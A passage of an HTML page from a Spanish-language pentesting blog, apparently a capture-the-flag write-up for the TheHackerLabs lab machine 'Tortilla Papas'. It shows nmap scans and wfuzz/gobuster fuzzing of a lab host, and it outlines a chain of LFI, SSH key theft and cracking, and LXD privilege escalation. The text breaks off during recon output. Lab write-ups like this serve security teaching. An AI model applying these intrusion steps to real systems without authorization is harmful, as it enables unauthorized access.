@@ -1,0 +1,1525 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tortilla Papas - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-tortillaPapas/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Tortilla Papas - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-tortillaPapas/tortillaPapas.jpg">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-quokka/">
+          <span class="side-post-card-title">Quokka</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-jaulaCon/">
+          <span class="side-post-card-title">JaulaCon</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Tortilla Papas</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-espetoMalaquenio/">
+          <span class="side-post-card-title">Espeto Malaqueño</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-pizzahot/">
+          <span class="side-post-card-title">PizzaHot</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Medium Machine</div>
+    
+    <h1>Tortilla Papas - TheHackerLabs</h1>
+    <div class="post-meta">23 March 2025 · 22 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-tortillaPapas/tortillaPapas.jpg" alt="Tortilla Papas - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Una máquina que es lo suficientemente complicada y que necesitas paciencia. Después de analizar los escaneos, entramos a la página web activa. Al no encontrar nada útil, aplicamos Fuzzing, siendo así que encontramos un archivo oculto de PHP. Al revisar este archivo, resulta ser una copia de la página principal. Siendo un archivo PHP, aplicamos Fuzzing para descubrir si ocupa un parámetro con la herramienta wfuzz y usando payloads que aplican LFI. Encontrando el parámetro correcto y viendo que funciona el LFI, tratamos de obtener la llave privada de un usuario, siendo que la encontramos en el directorio /opt. Crackeamos la llave y logramos ganar acceso a la máquina víctima. Dentro, vemos que podemos ocupar un binario llamado smokeping como otro usuario. A este binario, le aplicamos Shell Escape para escapar del manual del binario y convertirnos en el otro usuario. Al no poder ver qué privilegios tiene este usuario, encontramos que pertenece al grupo LXD. Logramos escalar privilegios aprovechandonos de este grupo, creando una montura de todos los archivos de la máquina víctima.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>wfuzz</code></li><li><code>gobuster</code></li><li><code>BurpSuite</code></li><li><code>ssh2john</code></li><li><code>JohnTheRipper</code></li><li><code>ssh</code></li><li><code>sudo</code></li><li><code>scp</code></li><li><code>zip2john</code></li><li><code>unzip</code></li><li><code>lxc</code></li><li><code>git</code></li><li><code>Python3</code></li><li><code>wget</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#fuzz">Fuzzing</a></li>
+        <li><a href="#Smokeping">Analizando Directorio smokeping</a></li>
+        <li><a href="#Agua">Analizando Peticiones y Respuestas de Archivo agua.php</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#fuzzLFI">Aplicando Fuzzing para Encontrar Parámetro Correcto Utilizando Payload de LFI</a></li>
+        <li><a href="#SSHkey">Robando Llave Privada id_rsa a través de LFI, Crackeandola con JohnTheRipper y Conectandonos Vía SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#enumLin">Enumeración de la Máquina Linux y Crackeando Archivo ZIP</a></li>
+        <li><a href="#shellEsc">Aplicando Shell Escape para Escalar Privilegios y Convertirnos en Usuario concebolla</a></li>
+        <li><a href="#lxd">Escalando Privilegios Aprovechandonos del Grupo lxd</a>
+          <ul>
+            <li><a href="#lxd2">Escalando Privilegios Aprovechandonos del Grupo LXD y Con Internet en la Máquina Víctima</a></li>
+            <li><a href="#lxd3">Escalando Privilegios Aprovechandonos del Grupo LXD y Sin Internet en la Máquina Víctima</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#fuzz">Fuzzing</a></li>
+        <li><a href="#Smokeping">Analizando Directorio smokeping</a></li>
+        <li><a href="#Agua">Analizando Peticiones y Respuestas de Archivo agua.php</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#fuzzLFI">Aplicando Fuzzing para Encontrar Parámetro Correcto Utilizando Payload de LFI</a></li>
+        <li><a href="#SSHkey">Robando Llave Privada id_rsa a través de LFI, Crackeandola con JohnTheRipper y Conectandonos Vía SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#enumLin">Enumeración de la Máquina Linux y Crackeando Archivo ZIP</a></li>
+        <li><a href="#shellEsc">Aplicando Shell Escape para Escalar Privilegios y Convertirnos en Usuario concebolla</a></li>
+        <li><a href="#lxd">Escalando Privilegios Aprovechandonos del Grupo lxd</a>
+          <ul>
+            <li><a href="#lxd2">Escalando Privilegios Aprovechandonos del Grupo LXD y Con Internet en la Máquina Víctima</a></li>
+            <li><a href="#lxd3">Escalando Privilegios Aprovechandonos del Grupo LXD y Sin Internet en la Máquina Víctima</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.1.190
+</span></span><span style="display:flex;"><span>PING 192.168.1.190 <span style="color:#f92672">(</span>192.168.1.190<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.190: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.59 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.190: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.791 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.190: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.845 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.190: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.947 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.1.190 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3043ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.791/1.042/1.586/0.318 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.1.190 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-03-21 13:03 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 13:03
+</span></span><span style="display:flex;"><span>Scanning 192.168.1.190 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 13:03, 0.10s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 13:03
+</span></span><span style="display:flex;"><span>Scanning 192.168.1.190 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 192.168.1.190
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 192.168.1.190
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 13:03, 7.97s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.190
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.00059s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-03-21 13:03:26 CST <span style="color:#66d9ef">for</span> 8s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 8.23 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.884MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.621MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Parece que solo hay 2 puertos activos. Es posible que la intrusión sea por el <strong>puerto 80</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 22,80 192.168.1.190 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-03-21 13:03 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.190
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00095s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.57 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Tortilla Papas
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.57 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.21 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Como mencione antes, parece que la intrusión será por la página web activa.</p>
+<p>Vamos a verla.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura1.png">
+</p>
+<p>Parece una página dedicada al platillo <strong>Tortilla de Papas</strong>.</p>
+<p>Veamos que nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura2.png">
+</p>
+<p>Son bastantes tecnologías, pero no veo que nos ayude alguna.</p>
+<p>De ahí en fuera, no veo algo que nos pueda ayudar.</p>
+<p>Vamos a aplicar <strong>Fuzzing</strong>, para ver si encontramos algo oculto por ahí.</p>
+<h3 id="fuzz">Fuzzing</h3>
+<p>Para este caso, costo bastante el encontrar el wordlists correcto, pues fue necesario probar varios de los que tiene <strong>Seclists</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">300</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -z list,php-txt-html-sh http://192.168.1.190/FUZZ.FUZ2Z
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://192.168.1.190/FUZZ.FUZ2Z
+</span></span><span style="display:flex;"><span>Total requests: 4740960
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000003:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">480</span> L    <span style="color:#ae81ff">1556</span> W     <span style="color:#ae81ff">26594</span> Ch    <span style="color:#e6db74">&#34;index - html&#34;</span>                                                                                                               
+</span></span><span style="display:flex;"><span>000147481:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W       <span style="color:#ae81ff">279</span> Ch      <span style="color:#e6db74">&#34;php&#34;</span>                                                                                                                        
+</span></span><span style="display:flex;"><span>000147483:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W       <span style="color:#ae81ff">279</span> Ch      <span style="color:#e6db74">&#34;html&#34;</span>                                                                                                                       
+</span></span><span style="display:flex;"><span>001590769:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">480</span> L    <span style="color:#ae81ff">1556</span> W     <span style="color:#ae81ff">26574</span> Ch    <span style="color:#e6db74">&#34;agua - php&#34;</span>                                                                                                                 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Total time: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">4740960</span>
+</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">4740955</span>
+</span></span><span style="display:flex;"><span>Requests/sec.: <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-c</em></td>
+					<td>Para ver el resultado en un formato colorido.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;hc</em></td>
+					<td>Para no mostrar un código de estado en los resultados.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-z</em></td>
+					<td>Para indicar una busqueda de archivos específicos.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora probemos con <strong>gobuster</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.1.190/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t <span style="color:#ae81ff">100</span> -x php,html,txt,sh
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://192.168.1.190/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              php,html,txt,sh
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/.html                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 279<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 317<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.1.190/images/<span style="color:#f92672">]</span>
